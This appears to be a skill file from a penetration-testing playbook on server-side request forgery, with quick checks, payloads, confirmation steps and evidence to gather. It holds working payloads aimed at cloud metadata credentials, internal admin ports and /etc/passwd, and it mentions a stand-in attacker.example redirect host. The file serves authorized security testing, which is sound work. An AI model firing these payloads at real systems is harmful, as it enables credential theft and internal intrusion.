---
id: ssrf
name: Server-Side Request Forgery
phase: exploit
severity: critical
aliases: [ssrf, server-side-request-forgery]
tags: [web, injection, server-side]
---

# Server-Side Request Forgery

## When to use
Use whenever the server fetches a URL on your behalf: webhooks, image/PDF fetchers, URL previews, import-from-URL, SSO metadata. Trigger on parameters named `url`, `uri`, `path`, `dest`, `redirect`, `callback`, `webhook`. Cloud-hosted apps raise priority due to metadata endpoints.

## Quick checks
1. Point the parameter at a collaborator domain (Burp Collaborator/interactsh) and watch for DNS/HTTP hits.
2. Try localhost: `http://127.0.0.1:80`, `http://localhost:8080`.
3. Try cloud metadata: `http://169.254.169.254/latest/meta-data/`.
4. Test alternate IP encodings: `http://2130706433`, `http://0x7f000001`.
5. Test URL parser bypasses: `http://127.1`, `http://[::1]`, `http://127.0.0.1@attacker`.
6. Check redirect behavior with an open redirect on the same host.

## Payloads / test cases
- `url=http://127.0.0.1:8080/admin`
- `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- `url=http://2130706433/` (decimal loopback).
- `url=http://[::ffff:127.0.0.1]/`
- `url=http://attacker.example/redirect?to=http://169.254.169.254/`
- `url=file:///etc/passwd` (only where file scheme is accepted).

## Detection & confirmation
1. Confirm the collaborator receives a request originating from the target's IP space.
2. For metadata, capture a response body fragment (IAM role name) as proof.
3. Distinguish full-read SSRF from blind: check if response body is returned.
4. Test internal ports with short timeouts to map services (only in-scope hosts).
5. Verify no caching layer caused a false hit (repeat with unique token).

## Escalation
Cloud metadata credential exposure -> P1; internal service access -> P1/P2; blind DNS-only SSRF -> P2/P3 (see prioritization.md).

## Evidence to capture
- Collaborator/interactsh interaction log with source IP and timestamp.
- Injected request and server response.
- Metadata response snippet (redact credential values in report).
- Port-scan timing table for internal discovery.
- Note on whether the response body was reflected.

## Common false positives
- Client-side JavaScript fetching the URL (not server-side).
- DNS prefetch or link previews from the researcher's own network.
- WAF/proxy hitting the collaborator instead of the origin.
- Cached responses replaying an earlier fetch.

## Related skills
- [[api-testing]]
- [[sqli]]
- [[auth-bypass]]
- [[subdomain-takeover]]
